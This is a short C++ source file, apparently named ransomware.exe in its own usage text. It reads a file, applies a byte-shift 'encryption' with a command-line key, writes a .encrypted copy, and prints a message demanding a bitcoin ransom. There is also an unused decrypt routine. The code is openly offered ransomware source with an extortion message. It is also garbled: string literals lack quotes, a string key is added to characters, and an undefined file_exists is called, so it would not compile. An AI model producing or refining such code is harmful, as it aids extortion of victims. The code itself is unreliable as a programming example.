#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>

using namespace std;

// function to encrypt file
void encryptFile(const string& filePath, const string& key) {
    // open the file for reading and writing
    ifstream inFile(filePath, ios::binary | ios::in);
    ofstream outFile(filePath + .encrypted, ios::binary | ios::out);

    // read data from the file
    string data;
    while (getline(inFile, data)) {
        // encrypt the data using the key
        for (auto& c : data) {
            c = (c + key) % 256;
        }

        // write the encrypted data to the output file
        outFile << data << endl;
    }
}

// function to decrypt file
void decryptFile(const string& filePath, const string& key) {
    // open the file for reading and writing
    ifstream inFile(filePath + .encrypted, ios::binary | ios::in);
    ofstream outFile(filePath, ios::binary | ios::out);

    // read data from the file
    string data;
    while (getline(inFile, data)) {
        // decrypt the data using the key
        for (auto& c : data) {
            c = (c - key) % 256;
        }

        // write the decrypted data to the output file
        outFile << data << endl;
    }
}

int main(int argc, char* argv[]) {
    // check if the correct number of arguments were provided
    if (argc != 3) {
        cout << Usage: ./ransomware.exe <encrypted file> <key> << endl;
        return 1;
    }

    // get the encrypted file path and key from command line arguments
    string filePath = argv[1];
    string key = argv[2];

    // check if the file exists
    if (!file_exists(filePath)) {
        cout << File does not exist. << endl;
        return 1;
    }

    // encrypt the file with the provided key
    encryptFile(filePath, key);

    // display a message to the user about their ransomware situation
    cout << Your files have been encrypted! << endl;
    cout << To decrypt them, please send us a ransom in bitcoin. << endl;

    return 0;
}
